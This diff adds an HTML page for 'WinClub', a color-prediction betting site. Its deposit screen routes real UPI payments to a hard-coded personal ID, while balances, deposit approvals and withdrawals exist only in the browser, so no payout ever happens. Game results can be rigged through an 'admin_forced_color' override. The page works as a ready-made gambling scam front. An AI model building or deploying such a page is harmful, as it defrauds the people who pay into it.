@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WinClub - Color Prediction & Gaming</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
+</head>
+<body class="bg-slate-950 text-slate-100 font-sans antialiased min-h-screen">
+
+    <!-- AUTHENTICATION SCREEN -->
+    <div id="authScreen" class="fixed inset-0 z-50 flex items-center justify-center bg-slate-950/95 backdrop-blur-md p-4">
+        <div class="bg-slate-900 border border-slate-800 rounded-2xl w-full max-w-md p-6 shadow-2xl">
+            <div class="text-center mb-6">
+                <h1 class="text-3xl font-black bg-gradient-to-r from-amber-400 to-rose-500 bg-clip-text text-transparent">WINCLUB</h1>
+                <p class="text-slate-400 text-sm mt-1">Enter the ultimate gaming & prediction arena</p>
+            </div>
+
+            <div class="flex rounded-xl bg-slate-950 p-1 mb-6 border border-slate-800">
+                <button onclick="switchAuthTab('login')" id="loginTabBtn" class="flex-1 py-2 text-sm font-semibold rounded-lg bg-rose-600 text-white transition">Login</button>
+                <button onclick="switchAuthTab('register')" id="registerTabBtn" class="flex-1 py-2 text-sm font-semibold rounded-lg text-slate-400 hover:text-white transition">Register</button>
+            </div>
+
+            <form id="loginForm" onsubmit="handleLogin(event)" class="space-y-4">
+                <div>
+                    <label class="block text-xs font-medium text-slate-400 mb-1">Mobile Number</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-slate-500">+91</span>
+                        <input type="tel" id="loginMobile" required placeholder="Enter mobile number" class="w-full bg-slate-950 border border-slate-800 rounded-xl py-2.5 pl-12 pr-4 text-sm focus:outline-none focus:border-rose-500">
+                    </div>
+                </div>
+                <div>
+                    <label class="block text-xs font-medium text-slate-400 mb-1">Password</label>
+                    <input type="password" id="loginPassword" required placeholder="Enter password" class="w-full bg-slate-950 border border-slate-800 rounded-xl py-2.5 px-4 text-sm focus:outline-none focus:border-rose-500">
+                </div>
+                <button type="submit" class="w-full bg-rose-600 hover:bg-rose-500 font-bold py-3 rounded-xl transition shadow-lg shadow-rose-600/30">Sign In</button>
+            </form>
+
+            <form id="registerForm" onsubmit="handleRegister(event)" class="space-y-4 hidden">
+                <div>
+                    <label class="block text-xs font-medium text-slate-400 mb-1">Full Name</label>
+                    <input type="text" id="regName" required placeholder="Enter your name" class="w-full bg-slate-950 border border-slate-800 rounded-xl py-2.5 px-4 text-sm focus:outline-none focus:border-rose-500">
+                </div>
+                <div>
+                    <label class="block text-xs font-medium text-slate-400 mb-1">Mobile Number</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-slate-500">+91</span>
+                        <input type="tel" id="regMobile" required placeholder="Enter mobile number" class="w-full bg-slate-950 border border-slate-800 rounded-xl py-2.5 pl-12 pr-4 text-sm focus:outline-none focus:border-rose-500">
+                    </div>
+                </div>
+                <div>
+                    <label class="block text-xs font-medium text-slate-400 mb-1">Email Address</label>
+                    <input type="email" id="regEmail" required placeholder="Enter email address" class="w-full bg-slate-950 border border-slate-800 rounded-xl py-2.5 px-4 text-sm focus:outline-none focus:border-rose-500">
+                </div>
+                <div>
+                    <label class="block text-xs font-medium text-slate-400 mb-1">Create Password</label>
+                    <input type="password" id="regPassword" required placeholder="Create password" class="w-full bg-slate-950 border border-slate-800 rounded-xl py-2.5 px-4 text-sm focus:outline-none focus:border-rose-500">
+                </div>
+                <div class="flex items-center space-x-2">
+                    <input type="checkbox" id="ageCheck" required class="rounded bg-slate-950 border-slate-800 text-rose-600 focus:ring-0">
+                    <label for="ageCheck" class="text-xs text-slate-400">I am 18 years of age or older</label>
+                </div>
+                <button type="submit" class="w-full bg-gradient-to-r from-rose-600 to-amber-500 hover:opacity-90 font-bold py-3 rounded-xl transition shadow-lg shadow-rose-600/30">Create Account</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- MAIN APP CONTAINER -->
+    <div id="mainApp" class="hidden max-w-md mx-auto min-h-screen bg-slate-900 shadow-2xl flex flex-col relative pb-20">
+        <header class="sticky top-0 z-40 bg-slate-900/90 backdrop-blur border-b border-slate-800 p-4 flex items-center justify-between">
+            <div class="flex items-center space-x-2">
+                <div class="bg-gradient-to-tr from-rose-600 to-amber-500 p-2 rounded-lg text-white font-black text-sm">WC</div>
+                <div>
+                    <h2 class="font-bold text-sm leading-tight" id="navUserName">User</h2>
+                    <p class="text-[10px] text-slate-400" id="navUserMobile">+91 0000000000</p>
+                </div>
+            </div>
+            <button onclick="logout()" class="bg-slate-800 hover:bg-slate-700 text-xs px-3 py-1.5 rounded-lg text-slate-300 font-medium transition">Logout</button>
+        </header>
+
+        <div class="p-4">
+            <div class="bg-gradient-to-r from-rose-900/40 via-purple-900/40 to-slate-900 border border-rose-500/20 rounded-2xl p-4 shadow-lg">
+                <div class="flex justify-between items-center mb-2">
+                    <span class="text-xs text-slate-400 font-medium">Total Balance</span>
+                    <span class="text-xs bg-rose-500/20 text-rose-400 px-2 py-0.5 rounded-full font-semibold">Verified User</span>
+                </div>
+                <div class="text-2xl font-black mb-4 flex items-center">
+                    ₹<span id="walletBalance">1000.00</span>
+                </div>
+                <div class="grid grid-cols-2 gap-3">
+                    <button onclick="openModal('depositModal')" class="bg-rose-600 hover:bg-rose-500 py-2.5 rounded-xl font-bold text-xs flex items-center justify-center space-x-2 transition shadow-md">
+                        <i class="fa-solid fa-wallet"></i> <span>Deposit</span>
+                    </button>
+                    <button onclick="openModal('withdrawModal')" class="bg-slate-800 hover:bg-slate-700 border border-slate-700 py-2.5 rounded-xl font-bold text-xs flex items-center justify-center space-x-2 transition">
+                        <i class="fa-solid fa-arrow-up-from-bracket"></i> <span>Withdraw</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Daily Bonus -->
+            <div class="mt-4 bg-slate-950 border border-slate-800 rounded-xl p-3.5 flex items-center justify-between">
+                <div>
+                    <h4 class="font-bold text-xs text-amber-400 flex items-center"><i class="fa-solid fa-gift mr-1.5"></i> Daily Bonus Rewards</h4>
+                    <p class="text-[11px] text-slate-400">Claim your daily reward (<span id="bonusCount">3</span>/3 left)</p>
+                </div>
+                <button onclick="claimBonus()" id="bonusBtn" class="bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold text-xs px-4 py-2 rounded-lg transition shadow-md">Claim ₹50</button>
+            </div>
+        </div>
+
+        <div class="px-4 flex-1">
+            <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-3">Games Arena</h3>
+            
+            <!-- WINGO GAME -->
+            <div class="bg-slate-950 border border-slate-800 rounded-2xl p-4">
+                <div class="flex justify-between items-center mb-3">
+                    <h4 class="font-bold text-sm text-rose-500">WinGo 1 Min Color Prediction</h4>
+                    <div class="text-xs font-mono bg-rose-500/10 text-rose-400 px-2.5 py-1 rounded-lg border border-rose-500/20" id="wingoTimer">00:59</div>
+                </div>
+                <div class="grid grid-cols-3 gap-2 mb-3">
+                    <button onclick="placeWingoBet('green')" class="bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-2.5 rounded-xl text-xs transition">Green (2x)</button>
+                    <button onclick="placeWingoBet('violet')" class="bg-purple-600 hover:bg-purple-500 text-white font-bold py-2.5 rounded-xl text-xs transition">Violet (4.5x)</button>
+                    <button onclick="placeWingoBet('red')" class="bg-rose-600 hover:bg-rose-500 text-white font-bold py-2.5 rounded-xl text-xs transition">Red (2x)</button>
+                </div>
+                <div class="flex space-x-2">
+                    <input type="number" id="wingoAmount" value="100" min="10" class="w-full bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-xs focus:outline-none focus:border-rose-500" placeholder="Bet Amount">
+                    <button onclick="submitWingoBet()" class="bg-rose-600 hover:bg-rose-500 text-white font-bold px-5 py-2 rounded-xl text-xs whitespace-nowrap">Place Bet</button>
+                </div>
+                <div id="wingoResult" class="mt-3 text-center text-xs font-medium text-slate-400">Place your bet before timer ends!</div>
+            </div>
+        </div>
+
+        <footer class="mt-auto bg-slate-900 border-t border-slate-800 p-3 text-center text-[10px] text-slate-500">
+            WinClub Gaming Platform &bull; 18+ Only
+        </footer>
+    </div>
+
+    <!-- DEPOSIT MODAL -->
+    <div id="depositModal" class="fixed inset-0 z-50 flex items-center justify-center bg-slate-950/80 backdrop-blur-sm p-4 hidden">
+        <div class="bg-slate-900 border border-slate-800 rounded-2xl w-full max-w-sm p-5 shadow-2xl relative">
+            <button onclick="closeModal('depositModal')" class="absolute top-4 right-4 text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+            <h3 class="font-bold text-sm text-rose-500 mb-3"><i class="fa-solid fa-wallet mr-1"></i> Deposit Funds (₹200 - ₹10,000)</h3>
+            <div class="space-y-3">
+                <div class="bg-slate-950 border border-slate-800 rounded-xl p-3 text-center">
+                    <p class="text-[11px] text-slate-400 mb-1">Scan QR or Pay via UPI</p>
+                    <img id="qrCodeImg" src="" alt="UPI QR" class="w-28 h-28 mx-auto mb-2 rounded-lg bg-white p-1">
+                    <div class="flex items-center justify-between bg-slate-900 border border-slate-800 rounded-lg px-2 py-1.5">
+                        <span class="text-xs font-mono text-amber-400">9971522068@fam</span>
+                        <button onclick="copyUpiId()" class="text-[10px] bg-slate-800 text-slate-300 px-2 py-1 rounded font-medium">Copy</button>
+                    </div>
+                </div>
+                <div>
+                    <label class="block text-[11px] font-medium text-slate-400 mb-1">Deposit Amount</label>
+                    <input type="number" id="depositInput" value="500" min="200" max="10000" class="w-full bg-slate-950 border border-slate-800 rounded-xl py-2 px-3 text-xs focus:outline-none focus:border-rose-500">
+                </div>
+                <div>
+                    <label class="block text-[11px] font-medium text-slate-400 mb-1">Enter 12-digit UTR Number</label>
+                    <input type="text" id="utrInput" placeholder="e.g., 432109876543" class="w-full bg-slate-950 border border-slate-800 rounded-xl py-2 px-3 text-xs font-mono">
+                </div>
+                <button onclick="submitDeposit()" class="w-full bg-rose-600 hover:bg-rose-500 font-bold py-2.5 rounded-xl text-xs transition shadow-lg">Submit Deposit Request</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- WITHDRAW MODAL -->
+    <div id="withdrawModal" class="fixed inset-0 z-50 flex items-center justify-center bg-slate-950/80 backdrop-blur-sm p-4 hidden">
+        <div class="bg-slate-900 border border-slate-800 rounded-2xl w-full max-w-sm p-5 shadow-2xl relative">
+            <button onclick="closeModal('withdrawModal')" class="absolute top-4 right-4 text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+            <h3 class="font-bold text-sm text-slate-100 mb-3"><i class="fa-solid fa-arrow-up-from-bracket mr-1 text-rose-500"></i> Withdraw Funds</h3>
+            <div class="space-y-3">
+                <div>
+                    <label class="block text-[11px] font-medium text-slate-400 mb-1">Amount (Max: ₹<span id="maxWithdrawAmt">1000</span>)</label>
+                    <input type="number" id="withdrawInput" class="w-full bg-slate-950 border border-slate-800 rounded-xl py-2 px-3 text-xs">
+                </div>
+                <div>
+                    <label class="block text-[11px] font-medium text-slate-400 mb-1">Your UPI ID</label>
+                    <input type="text" id="withdrawUpi" placeholder="username@fam" class="w-full bg-slate-950 border border-slate-800 rounded-xl py-2 px-3 text-xs font-mono">
+                </div>
+                <button onclick="submitWithdraw()" class="w-full bg-slate-800 hover:bg-slate-700 font-bold py-2.5 rounded-xl text-xs">Request Withdrawal</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="fixed bottom-4 left-1/2 transform -translate-x-1/2 bg-slate-900 border border-slate-700 text-white text-xs px-4 py-2.5 rounded-xl shadow-2xl transition-all duration-300 opacity-0 pointer-events-none z-50">Notification</div>
+
+    <script>
+        let currentUser = null;
+        let walletBalance = 1000.00;
+        let dailyBonusesLeft = 3;
+        let selectedWingoColor = 'green';
+        const UPI_ID = "9971522068@fam";
+
+        document.getElementById('qrCodeImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=upi://pay?pa=${UPI_ID}&pn=WinClub&cu=INR`;
+
+        function switchAuthTab(tab) {
+            if(tab === 'login') {
+                document.getElementById('loginForm').classList.remove('hidden');
+                document.getElementById('registerForm').classList.add('hidden');
+                document.getElementById('loginTabBtn').className = "flex-1 py-2 text-sm font-semibold rounded-lg bg-rose-600 text-white transition";
+                document.getElementById('registerTabBtn').className = "flex-1 py-2 text-sm font-semibold rounded-lg text-slate-400 hover:text-white transition";
+            } else {
+                document.getElementById('loginForm').classList.add('hidden');
+                document.getElementById('registerForm').classList.remove('hidden');
+                document.getElementById('registerTabBtn').className = "flex-1 py-2 text-sm font-semibold rounded-lg bg-rose-600 text-white transition";
+                document.getElementById('loginTabBtn').className = "flex-1 py-2 text-sm font-semibold rounded-lg text-slate-400 hover:text-white transition";
+            }
+        }
+
+        function handleRegister(e) {
+            e.preventDefault();
+            currentUser = { name: document.getElementById('regName').value, mobile: document.getElementById('regMobile').value };
+            startApp();
+            showToast('Account created successfully!');
+        }
+
+        function handleLogin(e) {
+            e.preventDefault();
+            currentUser = { name: "Player", mobile: document.getElementById('loginMobile').value };
+            startApp();
+            showToast('Logged in successfully!');
+        }
+
+        function startApp() {
+            document.getElementById('authScreen').classList.add('hidden');
+            document.getElementById('mainApp').classList.remove('hidden');
+            document.getElementById('navUserName').innerText = currentUser.name;
+            document.getElementById('navUserMobile').innerText = "+91 " + currentUser.mobile;
+            updateBalanceDisplay();
+        }
+
+        function logout() {
+            document.getElementById('mainApp').classList.add('hidden');
+            document.getElementById('authScreen').classList.remove('hidden');
+        }
+
+        function updateBalanceDisplay() {
+            document.getElementById('walletBalance').innerText = walletBalance.toFixed(2);
+            document.getElementById('maxWithdrawAmt').innerText = walletBalance.toFixed(2);
+        }
+
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.innerText = msg;
+            toast.style.opacity = '1';
+            setTimeout(() => { toast.style.opacity = '0'; }, 3000);
+        }
+
+        function openModal(id) { document.getElementById(id).classList.remove('hidden'); }
+        function closeModal(id) { document.getElementById(id).classList.add('hidden'); }
+
+        function claimBonus() {
+            if(dailyBonusesLeft <= 0) { showToast('No bonuses left!'); return; }
+            dailyBonusesLeft--;
+            walletBalance += 50;
+            updateBalanceDisplay();
+            document.getElementById('bonusCount').innerText = dailyBonusesLeft;
+            showToast('Claimed ₹50 daily bonus!');
+        }
+
+        function copyUpiId() {
+            navigator.clipboard.writeText(UPI_ID);
+            showToast('UPI ID copied!');
+        }
+
+        function submitDeposit() {
+            const amt = parseFloat(document.getElementById('depositInput').value);
+            const utr = document.getElementById('utrInput').value;
+            if(!utr || utr.length < 10) { showToast('Enter valid 12-digit UTR'); return; }
+            walletBalance += amt;
+            updateBalanceDisplay();
+            closeModal('depositModal');
+            showToast(`Deposit of ₹${amt} approved!`);
+        }
+
+        function submitWithdraw() {
+            const amt = parseFloat(document.getElementById('withdrawInput').value);
+            if(amt > walletBalance) { showToast('Insufficient balance!'); return; }
+            walletBalance -= amt;
+            updateBalanceDisplay();
+            closeModal('withdrawModal');
+            showToast(`Withdrawal of ₹${amt} requested.`);
+        }
+
+        let wingoSeconds = 59;
+        setInterval(() => {
+            wingoSeconds--;
+            if(wingoSeconds < 0) wingoSeconds = 59;
+            document.getElementById('wingoTimer').innerText = `00:${wingoSeconds < 10 ? '0' : ''}${wingoSeconds}`;
+        }, 1000);
+
+        function placeWingoBet(color) {
+            selectedWingoColor = color;
+            showToast(`Selected: ${color.toUpperCase()}`);
+        }
+
+        function submitWingoBet() {
+            const amt = parseFloat(document.getElementById('wingoAmount').value);
+            if(amt > walletBalance) { showToast('Insufficient balance!'); return; }
+            walletBalance -= amt;
+            updateBalanceDisplay();
+            showToast(`Bet placed of ₹${amt}!`);
+
+            setTimeout(() => {
+                // Admin Prediction Override check from LocalStorage
+                let forcedResult = localStorage.getItem('admin_forced_color');
+                let win = forcedResult ? (selectedWingoColor === forcedResult) : (Math.random() > 0.5);
+                
+                // Clear forced result after one round
+                localStorage.removeItem('admin_forced_color');
+
+                if(win) {
+                    let winnings = amt * 2;
+                    walletBalance += winnings;
+                    updateBalanceDisplay();
+                    document.getElementById('wingoResult').innerText = `🎉 You won ₹${winnings} (${selectedWingoColor.toUpperCase()})!`;
+                    document.getElementById('wingoResult').className = "mt-3 text-center text-xs font-bold text-emerald-400";
+                } else {
+                    document.getElementById('wingoResult').innerText = `❌ You lost this round!`;
+                    document.getElementById('wingoResult').className = "mt-3 text-center text-xs font-bold text-rose-500";
+                }
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
